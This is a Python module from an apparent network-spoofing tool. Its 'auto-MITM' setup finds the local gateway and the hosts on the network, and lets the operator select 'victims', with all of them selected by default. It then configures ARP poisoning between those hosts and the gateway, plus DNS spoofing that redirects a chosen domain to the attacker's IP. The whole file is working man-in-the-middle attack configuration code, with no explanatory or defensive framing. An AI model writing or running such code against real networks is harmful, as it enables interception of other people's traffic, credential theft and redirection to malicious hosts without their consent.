from __future__ import annotations

import ipaddress
from typing import Optional

import scapy.all as scapy
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt
from loguru import logger

from spoof.models import SpoofConfig, SpoofRule, ARPTarget, ARPVictim, MatchType, DNSAction
from spoof.platform import get_platform
from spoof.discovery import discover_network, DiscoveryResult


def detect_gateway(interface: str) -> Optional[str]:
    try:
        gw = scapy.conf.route.route("0.0.0.0")[2]
        if gw and gw != "0.0.0.0":
            return gw
    except Exception:
        pass
    return None


def detect_interface() -> Optional[str]:
    platform = get_platform()
    try:
        iface = scapy.conf.iface
        if iface:
            return iface.name if hasattr(iface, "name") else str(iface)
    except Exception:
        pass
    return platform.get_default_interface()


def discover_active_hosts(interface: str) -> list[DiscoveryResult]:
    try:
        return discover_network(interface, timeout=2)
    except Exception as e:
        logger.warning(f"host discovery failed: {e}")
        return []


def auto_mitm_setup(
    interface: Optional[str] = None,
    spoof_ip: Optional[str] = None,
    dns_target: Optional[str] = None,
    console: Optional[Console] = None,
) -> Optional[SpoofConfig]:
    cons = console or Console()

    cons.print(Panel("[bold cyan]AUTO-MITM — Smart Setup[/bold cyan]", border_style="cyan"))

    iface = interface or detect_interface()
    if not iface:
        cons.print("[red]no network interface found[/red]")
        return None
    cons.print(f"[green]interface:[/green] {iface}")

    gateway = detect_gateway(iface)
    if gateway:
        cons.print(f"[green]gateway:[/green] {gateway}")
    else:
        gateway = Prompt.ask("[yellow]gateway IP not detected, enter manually[/yellow]")

    hosts = discover_active_hosts(iface)
    if not hosts:
        cons.print("[yellow]no hosts discovered, enter victim IP manually[/yellow]")
        victim = Prompt.ask("victim IP")
        victims = [ARPVictim(ip=victim)]
    else:
        non_gw = [h for h in hosts if not h.is_gateway]
        table = Table(title="Discovered Hosts")
        table.add_column("#", style="cyan")
        table.add_column("IP", style="white")
        table.add_column("Hostname", style="dim")
        table.add_column("Vendor", style="dim")
        for i, h in enumerate(non_gw[:20], 1):
            table.add_row(str(i), h.ip, h.hostname or "-", h.vendor or "-")
        cons.print(table)

        selection = Prompt.ask(
            "select victims (comma-separated numbers or 'all')",
            default="all",
        )
        if selection.strip().lower() == "all":
            targets = non_gw
        else:
            try:
                idxs = [int(x.strip()) - 1 for x in selection.split(",")]
                targets = [non_gw[i] for i in idxs if 0 <= i < len(non_gw)]
            except (ValueError, IndexError):
                cons.print("[red]invalid selection[/red]")
                return None

        victims = [ARPVictim(ip=h.ip, mac=h.mac) for h in targets]
        cons.print(f"[green]{len(victims)} victim(s) selected[/green]")

    own_ip = scapy.get_if_addr(iface)
    spoof = spoof_ip or own_ip or "192.168.1.100"

    domain = dns_target or Prompt.ask("target domain", default="*.vulnweb.com")
    if "*" in domain:
        match_type = MatchType.WILDCARD
    else:
        match_type = MatchType.EXACT

    config = SpoofConfig()
    config.session.interface = iface
    config.session.auto_firewall = True
    config.session.restore_on_exit = True

    config.dns.enabled = True
    config.dns.interface = iface
    config.dns.targets = [
        SpoofRule(
            pattern=domain,
            match_type=match_type,
            action=DNSAction.REDIRECT,
            redirect_ip=spoof,
        )
    ]

    config.arp.enabled = True
    config.arp.interface = iface
    config.arp.targets = [
        ARPTarget(gateway=gateway, victims=victims, enabled=True)
    ]

    return config
